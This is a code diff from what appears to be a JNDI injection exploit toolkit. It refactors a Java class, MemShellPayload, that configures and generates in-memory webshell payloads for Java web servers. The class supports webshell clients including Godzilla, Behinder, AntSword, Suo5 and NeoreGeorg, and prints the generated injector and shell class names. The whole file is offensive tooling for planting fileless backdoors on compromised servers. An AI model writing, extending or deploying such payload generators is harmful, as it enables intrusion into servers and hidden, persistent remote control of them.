@@ -1,15 +1,15 @@
 package map.jndi.payload;
 
 import com.reajason.javaweb.memshell.MemShellGenerator;
-import com.reajason.javaweb.memshell.Server;
+import com.reajason.javaweb.memshell.MemShellResult;
 import com.reajason.javaweb.memshell.ShellTool;
 import com.reajason.javaweb.memshell.config.*;
 
 public class MemShellPayload {
-    public static GenerateResult generate(String server, String tool, String type) {
+    public static MemShellResult generate(String server, String tool, String type) {
         ShellConfig shellConfig = ShellConfig.builder()
-                .server(Server.valueOf(server))
-                .shellTool(ShellTool.valueOf(tool))
+                .server(server)
+                .shellTool(tool)
                 .shellType(type)
                 .shrink(true)
                 .debug(false)
@@ -19,7 +19,7 @@ public class MemShellPayload {
 
         return MemShellGenerator.generate(shellConfig, injectorConfig, shellToolConfig);
     }
-    public static void printInfo(GenerateResult result) {
+    public static void printInfo(MemShellResult result) {
         System.out.println();
         System.out.println("Injector ClassName: " + result.getInjectorClassName());
         System.out.println("Shell ClassName: " + result.getShellClassName());
@@ -28,19 +28,19 @@ public class MemShellPayload {
         System.out.println();
     }
 
-    public static ShellToolConfig getShellToolConfig(ShellTool shellTool) {
+    public static ShellToolConfig getShellToolConfig(String shellTool) {
         switch (shellTool) {
-            case Godzilla:
+            case ShellTool.Godzilla:
                 return GodzillaConfig.builder().build();
-            case Behinder:
+            case ShellTool.Behinder:
                 return BehinderConfig.builder().build();
-            case AntSword:
+            case ShellTool.AntSword:
                 return AntSwordConfig.builder().build();
-            case Command:
+            case ShellTool.Command:
                 return CommandConfig.builder().build();
-            case Suo5:
+            case ShellTool.Suo5:
                 return Suo5Config.builder().build();
-            case NeoreGeorg:
+            case ShellTool.NeoreGeorg:
                 return NeoreGeorgConfig.builder().build();
             default:
                 throw new UnsupportedOperationException("Unknown Shell Tool");
